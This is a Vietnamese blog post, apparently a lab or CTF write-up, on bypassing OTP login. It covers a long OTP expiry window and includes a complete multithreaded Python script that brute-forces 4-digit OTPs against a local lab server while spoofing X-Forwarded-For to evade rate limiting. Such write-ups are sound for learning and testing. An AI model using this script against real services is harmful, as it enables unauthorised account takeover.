---
layout: post
title:  "authentication"
date:   2026-02-02 10:51:00 +0700
tags: WPT
categories: jekyll update
---

## 🧪 Level 1

---

![image.png](/assets/images/WPT/authen/image.png)

Đầu tiên mình thấy có form login nhưng muốn vào được thì cần phải cung cấp đúng mã OTP. 

Mình thử nhập một số điện thoại để nó có thể sinh ra mã OTP.

![image.png](/assets/images/WPT/authen/image%201.png)

Khi mình thử nhập một mã OTP thì xem hành vi như thế nào.

![image.png](/assets/images/WPT/authen/image%202.png)

Mình tiến hành đọc source code. 

![image.png](/assets/images/WPT/authen/image%203.png)

Từ đây mình thấy là thời gian để cho mã OTP hết hạn là 15 phút như vậy là quá dài và mình hoàn toàn có thể đoán. 

![image.png](/assets/images/WPT/authen/image%204.png)

Như vậy sau khi đoán thì mã OTP là **`3478`** 

## 🧪 Level 2

---

Tương tự như level 1 nhưng nó đã có biện pháp ngăn chặn bằng **rate-limit.** Nghĩa là bị giới hạn khi gửi request

![Screenshot 2026-02-02 145222.png](/assets/images/WPT/authen/Screenshot_2026-02-02_145222.png)

![Screenshot 2026-02-02 145323.png](/assets/images/WPT/authen/Screenshot_2026-02-02_145323.png)

Nhưng nó xác định người gửi bằng **`HTTP_X_FORWARDED_FOR`** từ đây mình có thể giả mạo.

Từ đây mình viết script như sau: 

```python
**import requests
import concurrent.futures
import sys

# --- CẤU HÌNH ---
TARGET_URL = "http://192.168.116.129:4202/"
PHONE = "0123456789"
COOKIE = {"PHPSESSID": "17da2cd099449f5c8eb8732fd0d687a2"} # Cookie của bạn
FAIL_TEXT = "User not exist or OTP is wrong" # Dấu hiệu nhận biết thất bại

# Headers cơ bản (Copy từ Burp request của bạn)
BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://192.168.116.129:4202",
    "Referer": "http://192.168.116.129:4202/index.php"
}

def brute_force(otp_number):
    # 1. Format OTP thành 4 chữ số (ví dụ: 5 -> "0005")
    otp_code = f"{otp_number:04d}"
    
    # 2. Tạo IP giả để Bypass Rate Limit
    # Mỗi lần thử OTP khác nhau -> IP khác nhau -> Redis không bao giờ chặn
    fake_ip = str(otp_number + 10000) 
    
    headers = BASE_HEADERS.copy()
    headers["X-Forwarded-For"] = fake_ip 
    
    data = {
        "phone": PHONE,
        "otp": otp_code
    }
    
    try:
        # 3. Gửi Request
        response = requests.post(TARGET_URL, headers=headers, cookies=COOKIE, data=data, timeout=5)
        
        # 4. Kiểm tra kết quả
        # Nếu dòng thông báo lỗi KHÔNG xuất hiện -> Đã tìm thấy đúng
        if FAIL_TEXT not in response.text:
            print(f"\n[+] BINGO! OTP ĐÚNG LÀ: {otp_code}")
            print(f"[+] IP giả đã dùng: {fake_ip}")
            print("-" * 30)
            # Tùy chọn: In ra response để xem server trả về gì khi đúng
            # print(response.text[:200]) 
            
            # Ghi vào file và thoát chương trình
            with open("success.txt", "w") as f:
                f.write(f"OTP: {otp_code}")
            sys.exit(0) # Dừng toàn bộ script ngay lập tức
            
        else:
            # In tiến trình mỗi 500 số để đỡ rối mắt
            if otp_number % 500 == 0:
                print(f"[*] Đang thử tới {otp_code}... (Vẫn sai)")
                
    except Exception as e:
        # Bỏ qua lỗi kết nối nhỏ để script chạy tiếp
        pass

def main():
    print(f"[*] Bắt đầu tấn công Brute-force OTP cho SĐT: {PHONE}")
    print(f"[*] Dấu hiệu thất bại: '{FAIL_TEXT}'")
    print("[*] Đang chạy đa luồng (20 threads)...")
    
    # Sử dụng 20 luồng chạy song song để quét nhanh hơn
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        # Tạo danh sách chạy từ 0000 đến 9999
        executor.map(brute_force, range(10000))

if __name__ == "__main__":
    main()**
```

Sau đó mình chạy thì thu được kết quả. 

![image.png](/assets/images/WPT/authen/image%205.png)

Sau đó mình login vào trang.

![image.png](/assets/images/WPT/authen/image%206.png)